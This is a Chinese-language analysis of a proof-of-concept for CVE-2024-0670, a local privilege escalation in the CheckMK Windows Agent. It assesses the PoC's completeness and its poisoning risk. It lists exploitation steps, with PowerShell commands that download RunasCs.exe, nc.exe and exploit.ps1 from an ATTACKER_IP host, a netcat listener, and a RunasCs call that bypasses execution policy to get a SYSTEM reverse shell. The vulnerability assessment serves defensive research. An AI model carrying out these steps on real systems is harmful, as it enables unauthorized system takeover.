## CVE-2024-0670 - CheckMK Windows Agent 本地权限提升 (Local Privilege Escalation)

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升 (Local Privilege Escalation)

**影响应用:** CheckMK Windows Agent

**危害等级:** 高危

**CVSS评分:** 未提供，预计高危，通常本地权限提升漏洞CVSS基础分较高

**影响版本:** 未明确指定，涉及所有存在此漏洞的CheckMK Windows Agent版本

**利用条件:** 需要低权限Windows用户权限；PowerShell需启用；目标系统需安装CheckMK Windows Agent；攻击者需具备从目标系统下载文件的能力。

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

POC有效性分析：
该POC针对CheckMK Windows Agent中的CVE-2024-0670本地权限提升漏洞，提供了一个“简洁且清晰”的利用方案。漏洞的核心在于CheckMK Agent在执行MSI修复过程中，会从`C:\Windows\Temp\`路径执行文件。如果一个低权限用户能够在该路径下放置具有可预测名称的恶意文件（例如，用于触发反向shell），并触发MSI修复过程，这些文件将被以NT AUTHORITY\SYSTEM权限执行，从而实现权限提升。此POC的有效性体现在其提供了完整的利用链：
1.  辅助工具：提供了`RunasCs.exe`（一个支持明文密码的runas替代品，其源码`RunasCs.cs`清晰可读）和`nc.exe`（Netcat，一个众所周知的网络工具，用于建立反向shell）。`RunasCs.exe`的作用是方便以指定用户运行命令，这在多用户环境中触发漏洞尤其有用，它简化了以现有用户身份执行提升命令的复杂性。
2.  核心脚本：`exploit.ps1`（尽管其具体代码未直接提供，但README描述其功能为“种子化”多个payload文件名并触发MSI修复以实现SYSTEM执行）是整个攻击流程的关键。它负责在`C:\Windows\Temp\`中创建恶意文件，并启动MSI修复。这个脚本是实现权限提升的核心逻辑载体。
3.  清晰的步骤：README详细列出了攻击者需要执行的每一步，包括启动Python HTTP服务器托管恶意文件、在目标机器上下载这些文件、启动Netcat监听器，以及最终执行`RunasCs.exe`来启动`exploit.ps1`。这些步骤是逻辑连贯且易于理解和复现的。
4.  最终效果：攻击成功后可获得SYSTEM权限的反向shell，这直接验证了权限提升的成功，表明该POC能够达到其声明的攻击目标。

整个POC设计合理，利用了Windows MSI修复机制的缺陷，结合自定义工具和脚本，实现了从低权限用户到SYSTEM权限的完整提升，因此被判定为功能完整且可复现。

利用步骤：
要利用CVE-2024-0670，攻击者需要遵循以下步骤：
1.  环境准备: 攻击者机器上需要安装Python以运行简单的HTTP服务器，并安装Netcat以监听反向shell。目标机器上必须安装CheckMK Windows Agent，并且允许低权限用户访问PowerShell。
2.  托管恶意文件: 在攻击者机器上，将`RunasCs.exe`、`nc.exe`和`exploit.ps1`文件放置在一个目录下，并启动一个简单的Python HTTP服务器（例如`python3 -m http.server 8000`），以便目标机器可以下载这些文件。
3.  下载攻击工具: 在目标Windows机器上，通过PowerShell执行`Invoke-WebRequest`命令，将`RunasCs.exe`、`nc.exe`和`exploit.ps1`下载到`C:\Windows\Temp\`目录。
    ```powershell
    Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"
    Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"
    Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/exploit.ps1" -OutFile "C:\Windows\Temp\exploit.ps1"
    ```
4.  启动监听器: 在攻击者机器上启动Netcat监听器，等待反向shell连接，例如：`nc -lvnp 1111`。
5.  执行漏洞利用: 在目标机器上，使用`RunasCs.exe`以当前用户或指定用户身份执行`exploit.ps1`脚本，触发MSI修复过程。
    ```powershell
    .\RunasCs.exe username "password" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"
    ```
6.  获得SYSTEM权限: 如果利用成功，攻击者的Netcat监听器将收到一个来自目标机器的SYSTEM权限反向shell。

投毒风险分析：
在评估此POC的投毒风险时，我们主要关注POC代码本身是否包含超出其声明功能的恶意或可疑行为，而非其作为攻击工具所实现的功能。本POC的投毒风险被评估为“低”，具体分析如下：
1.  代码清晰度与可读性：提供的`RunasCs.cs`源代码是清晰且可读的C#代码。它没有明显的混淆、加密或其他试图隐藏真实意图的技术。代码逻辑主要围绕进程创建、用户模拟和Windows API调用，符合其作为`runas`替代工具的声明功能。这使得安全研究人员和分析师可以相对容易地审查其功能，确保其不包含额外恶意负载。
2.  依赖项透明性：POC明确指出了所需的工具，如`nc.exe`和`exploit.ps1`。`nc.exe`是一个众所周知的网络工具，其功能是透明的。尽管`exploit.ps1`的源代码未提供，但其在README中的描述（“种子化多个payload文件名并触发MSI修复以实现SYSTEM执行”）清晰地表明了其在攻击链中的作用，且其行为是攻击者主动控制的，而非POC开发者“投毒”给使用者的。该脚本是攻击载荷的一部分，而非POC本身携带的额外恶意代码。
3.  无外部未知引用：`RunasCs.cs`代码主要依赖于.NET框架的标准库和Windows API，没有发现引用未知的、可疑的外部库或二进制文件。这意味着POC的执行不会悄悄引入第三方恶意组件。
4.  攻击流程的控制权：整个攻击链要求攻击者手动设置HTTP服务器，下载工具到目标机器，并启动Netcat监听器。这些步骤都需要攻击者的明确操作和控制。POC代码本身并未包含自动连接到恶意C2服务器、下载额外恶意软件或执行其他未经授权行为的逻辑。所谓的“下载文件”是利用步骤的一部分，即攻击者将自己的攻击载荷（反向shell和`exploit.ps1`）发送到目标，而不是POC本身从外部下载恶意载荷来感染使用者。
5.  法律免责声明：README中包含了明确的法律免责声明，指出该项目仅用于教育和授权渗透测试，作者不对滥用负责。虽然免责声明本身不能消除恶意代码，但它反映了项目创建者的意图，即将其定位为安全研究工具。

综上所述，尽管POC旨在进行攻击，但其自身的代码（特别是提供的C#源码）并没有表现出投毒迹象，即在使用者不知情的情况下植入后门、收集信息或执行其他恶意操作。因此，对于防御性安全研究人员而言，该POC代码可被认为是相对安全的分析对象，投毒风险较低。

**项目地址:** 未提供公开仓库地址，当前为本地文件系统路径

**漏洞详情:** https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/
